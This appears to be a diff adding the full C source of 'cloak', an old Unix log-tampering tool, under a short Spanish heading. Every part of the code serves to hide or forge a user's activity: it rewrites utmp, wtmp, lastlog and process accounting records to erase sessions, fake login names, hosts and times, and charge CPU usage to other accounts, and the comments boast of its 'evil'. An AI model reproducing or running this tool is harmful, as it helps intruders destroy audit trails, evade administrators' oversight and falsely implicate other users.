@@ -1,0 +1,374 @@
+
+Código fuente del programa Cloak
+
+
+/*
+ * C L O A K
+ *
+ * Wrap yourself in a cloak of darkness (heh heh heh).
+ *
+ * Michael S. Baldwin,  Matthew Diaz  1982
+ *
+ * Marcus J. Ranum - 1983 - complete re-write and munging
+ * added more options, and all kinds of evil - including the
+ * ability to vanish from wtmp and acct as well as utmp. Added more
+ * error checking and useful command syntax. Now you can attribute
+ * all *YOUR* CPU usage to others when playing hack !!!
+ *
+ */
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <utmp.h>
+#include <pwd.h>
+#include <lastlog.h>
+#include <sys/file.h>
+#include <sys/acct.h> 
+
+/* set these guys. If you're sysV a port should be easy */
+#define UTMP "/etc/utmp"
+#define WTMP "/usr/adm/wtmp"
+#define LAST "/usr/adm/lastlog"
+#define ACCT "/usr/adm/acct"  
+
+main(ac,av)
+int     ac;
+char    *av[];
+{
+  char *tp = "";
+  char *un = "";
+  char *hn = "";
+  char *pn = "";
+  long newt = 0L;
+  int wflg = 0;
+  int aflg = 0;
+  int refs = 1;
+  int x;        /* klunch */
+  char *p;
+  extern char *index();
+  extern time_t time();
+
+  for(x = 1; x < ac; x++) {
+    if(av[x][0] == '-')
+      switch(av[x][1]) {
+        case 'u':       /* username to be :-) */
+          if((x + 1) < ac)
+            un = av[++x];
+        break;
+        case 't':       /* tty slot to be on :-) */
+          if((x + 1) < ac)
+            tp = av[++x];
+        break;
+        case 'h':       /* host name to be on :-) */
+          if((x + 1) < ac)
+            hn = av[++x];
+        break;
+        case 'r':       /* # of refs to zap :-) */
+          if((x + 1) < ac)
+            refs = atoi(av[++x]);
+        break;
+        case 's':
+          execl("/bin/sh","sh",0);
+          perror("exec");
+          exit(1);
+        case 'w':       /* vanish from wtmp, too */
+          wflg++;
+        break;
+        case 'a':       /* vanish from acct, too */
+          aflg++;
+        break;
+        case 'p':       /* specific program for acct */
+          if((x + 1) < ac)
+          pn = av[++x];
+        break;
+        case 'l':       /* log on time */
+          if((x + 1) >= ac)
+            break;
+          newt = atoi(p = av[++x]);
+          if(p = index(p,':'))  {
+            newt *= 60;
+            newt += ((newt > 0) ? 1 : -1) *
+            atoi(++p);
+            }
+          newt *= 60;
+          newt += time((long *)0L);
+        break;
+        default:
+          exit(usage());
+      }
+    }
+
+  if(wflg && wtmpzap(tp,un,hn,newt,refs))
+    perror(av[0]);
+
+  if(aflg && acctzap(un,pn))
+    perror(av[0]);
+
+  if(utmpzap(tp,un,hn,newt)) {
+    perror(av[0]);
+    exit(1);
+   }
+
+  if(lastzap(tp,un,hn,newt)) {
+    perror(av[0]);
+    exit(1);
+   }
+
+  exit(0);
+}
+
+ 
+
+utmpzap(tt,un,hn,tim)
+char *tt;
+char *un;
+char *hn;
+long tim;
+{
+  int fd;
+  int slot;
+  struct utmp ubuf;
+  extern time_t time();
+  extern char *strncpy();
+  extern long lseek();
+
+  if((slot = ttyslot()) == 0) {
+    (void)fprintf(stderr,"No tty slot");
+    return(-1);
+   }
+
+  if((fd = open(UTMP,O_RDWR)) == -1 )
+    return(-1);
+
+  if(lseek(fd,(long)(slot * sizeof(ubuf)),0) < 0) {
+    (void)close(fd);
+    return(-1);
+   }
+
+  if(read(fd,(char *)&ubuf,sizeof(ubuf)) != sizeof(ubuf)) {
+    (void)close(fd);
+    return(-1);
+   }
+
+  if(tim)
+    ubuf.ut_time = tim;
+  else
+    ubuf.ut_time = time((long *)0L);
+
+  (void)strncpy(ubuf.ut_name,un,sizeof(ubuf.ut_name));
+
+  if(!tt[0] == '\0')
+    (void)strncpy(ubuf.ut_line,tt,sizeof(ubuf.ut_line));
+
+  (void)strncpy(ubuf.ut_host,hn,sizeof(ubuf.ut_host));
+
+  if(lseek(fd,(long)(-sizeof(ubuf)), 1) < 0) {
+    (void)close(fd);
+    return(-1);
+   }
+
+  if(write(fd,(char *)&ubuf,sizeof(ubuf)) != sizeof(ubuf)) {
+    (void)close(fd);
+    return(-1);
+   }
+
+  return(close(fd));
+}
+
+ 
+
+wtmpzap(tt,un,hn,tim,refs)
+char    *tt;
+char    *un;
+char    *hn;
+long    tim;
+int     refs;
+{
+  int fd;
+  char *p;
+  char tbuf[40];
+  struct utmp ubuf;
+  extern char *strncpy();
+  extern char *strcpy();
+  extern char *rindex();
+  extern char *ttyname();
+  extern long lseek();
+  extern time_t time();
+
+  if((p = ttyname(0)) != NULL)
+    (void)strcpy(tbuf,p);
+  else
+    return(0);
+
+  /* figure out our device name */
+  p = rindex(tbuf,'/');
+  if(p == NULL)
+    p = tbuf;
+  else
+    p++;
+
+  if((fd = open(WTMP,O_RDWR)) == -1 )
+    return(-1);
+
+  if(lseek(fd,0L,2) < 0)
+    return(-1); 
+
+  /* this is gross, but I haven't a better idea how it can */
+  /* be done - so who cares ? */
+
+  while(refs) {
+    if((lseek(fd,(long)(-sizeof(ubuf)),1)) < 0) {
+      (void)close(fd);
+      return(0);
+    }
+
+    if(read(fd,(char *)&ubuf,sizeof(ubuf)) != sizeof(ubuf)) {
+      (void)close(fd);
+      return(0);
+     }
+
+    if(!strcmp(p,ubuf.ut_line)) {
+      if(tim)
+        ubuf.ut_time = tim;
+      else
+        ubuf.ut_time = time((long *)0L);
+
+      (void)strncpy(ubuf.ut_name,un,sizeof(ubuf.ut_name));
+      (void)strncpy(ubuf.ut_host,hn,sizeof(ubuf.ut_host));
+
+      if(!tt[0] == '\0')
+        (void)strncpy(ubuf.ut_line,tt,sizeof(ubuf.ut_line));
+
+      if(lseek(fd,(long)(-sizeof(ubuf)),1) < 0) {
+        (void)close(fd);
+        return(0);
+      }
+
+      if(write(fd,(char *)&ubuf,sizeof(ubuf)) != sizeof(ubuf)) {
+        (void)close(fd);
+        return(0);
+       }
+
+      if(lseek(fd,(long)(-sizeof(ubuf)),1) < 0) {
+        (void)close(fd);
+        return(0);
+       }
+
+      refs--;
+    }
+
+    if(lseek(fd,(long)(-sizeof(ubuf)),1) < 0) {
+      (void)close(fd);
+      return(0);
+     }
+   }
+ return(close(fd));
+}
+
+ 
+
+acctzap(un,pn)
+char    *un;
+char    *pn;
+{
+  int fd;
+  int faku =0;
+  int realu;
+  struct acct actbuf;
+  struct passwd *pwt;
+  extern struct passwd *getpwnam();
+
+  if((fd = open(ACCT,O_RDWR)) == -1 )
+    return(-1);
+
+  realu = getuid();
+  if(un[0] != '\0' && ((pwt = getpwnam(un)) != NULL))
+  faku = pwt->pw_uid;
+
+  while(1) {
+    if(read(fd,(char *)&actbuf,sizeof(actbuf)) != sizeof(actbuf)) {
+      (void)close(fd);
+      return(0);
+     }
+
+     if(realu == actbuf.ac_uid) {
+     /* only zap a specific program to user */
+       if(pn[0] != '\0' && strcmp(pn,actbuf.ac_comm))
+         continue;
+       actbuf.ac_uid = faku;
+       actbuf.ac_flag &= ~ASU;
+       if(lseek(fd,(long)(-sizeof(actbuf)),1) < 0) {
+         (void)close(fd);
+         return(0);
+        }
+       if(write(fd,(char *)&actbuf,sizeof(actbuf)) != sizeof(actbuf)) {
+         (void)close(fd);
+         return(0);
+        }
+      }
+    }
+}
+
+ 
+
+usage()
+{
+#ifdef USAGE
+  (void)fprintf(stderr,"usage: cloak <options>\n");
+  (void)fprintf(stderr,"options are:\t-l <+->hh:mm (login time)\n");
+  (void)fprintf(stderr,"\t\t-u username\t\t\t-t ttyname\n");
+  (void)fprintf(stderr,"\t\t-w (clobber wtmp)\t\t-r #of refs to clobber\n");
+  (void)fprintf(stderr,"\t\t-h host\t\t-a (clobber accounting)\n");
+  (void)fprintf(stderr,"\t\t-p program (attribute only program to acct)\n");
+  (void)fprintf(stderr,"(no args causes a simple vanishing act)\n");
+#endif
+  return(1);
+}
+
+ 
+
+lastzap(tt,un,hn,tim)
+char *tt;
+char *un;
+char *hn;
+long tim;
+{
+  int fd;
+  int uid;
+  struct lastlog lbuf;
+  extern time_t time();
+  extern char *strncpy();
+  extern long lseek(); 
+
+  uid = getuid();
+  if((fd = open(LAST,O_RDWR)) == -1 )
+    return(-1);
+  if(lseek(fd,(long)(uid * sizeof(lbuf)),0) < 0) {
+    (void)close(fd);
+    return(-1);
+   }
+  if(read(fd,(char *)&lbuf,sizeof(lbuf)) != sizeof(lbuf)) {
+    (void)close(fd);
+    return(-1);
+   }
+  if(tim)
+      lbuf.ll_time = tim;
+    else
+      lbuf.ll_time = time((long *)0L);
+  if(!tt[0] == '\0')
+    (void)strncpy(lbuf.ll_line,tt,sizeof(lbuf.ll_line));
+
+  (void)strncpy(lbuf.ll_host,hn,sizeof(lbuf.ll_host));
+
+  if(lseek(fd,(long)(-sizeof(lbuf)), 1) < 0) {
+    (void)close(fd);
+    return(-1);
+   }
+  if(write(fd,(char *)&lbuf,sizeof(lbuf)) != sizeof(lbuf)) {
+    (void)close(fd);
+    return(-1);
+   }
+
+  return(close(fd));
+}
+
